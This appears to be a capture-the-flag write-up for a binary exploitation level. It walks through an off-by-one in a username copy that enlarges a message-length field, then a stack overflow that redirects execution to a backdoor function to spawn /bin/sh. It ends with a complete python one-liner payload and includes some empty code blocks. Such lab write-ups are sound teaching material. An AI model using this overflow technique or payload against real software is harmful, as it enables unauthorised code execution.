After analyzing the program, we see that the `main` call the function `handle_msg`. This function use a struct that contain a 140 char message, a 40 char username, and a number that represent the max length of the message, it should looks like this :
[Message][username][number hard coded to 140]
[140 char][40 char][the number 140]

But the function `set_username` allow use to copy 41 char :
`for ( i = 0; i <= 40 && s[i]; ++i )`
And since we start copying the username at the index `140` (from the start of the struct) we can write until the index `181`

So we can change the low order part of the number and change 140 : `0x8c` to the max we can put `0xff`

Since the max length of the message is set from the number at the index `180` from the start of the struct.
We can now write a message of `255` char long and overflow the struct.
Let's try to put 40 char to fill the buffer and a the char `\xff` at the end to find the offset to `eip` using [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```

```

Since we are on 64-bit the return address is in `$rsp`
Putting this in [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) give us an offset of `200`

Now that we have the offset, we get the address of the function `secret_backdoor` that allow use to launch a command

```

Address of `secret_backdoor` : `0x55555555488c`
In little-endian : `\x8c\x48\x55\x55\x55\x55\x00\x00`

Let's recap
1 part : username (override that we use to overwrite the number) `"a" * 40 + "\xff"`
2 part : Our offset and the address which we will write `"a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"`
3 part : the command that will be execute with `system` : `"/bin/sh"`

on assemble le tout : `python -c 'print "a"*40 + "\xff" + "\n" + "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'`

```Shell
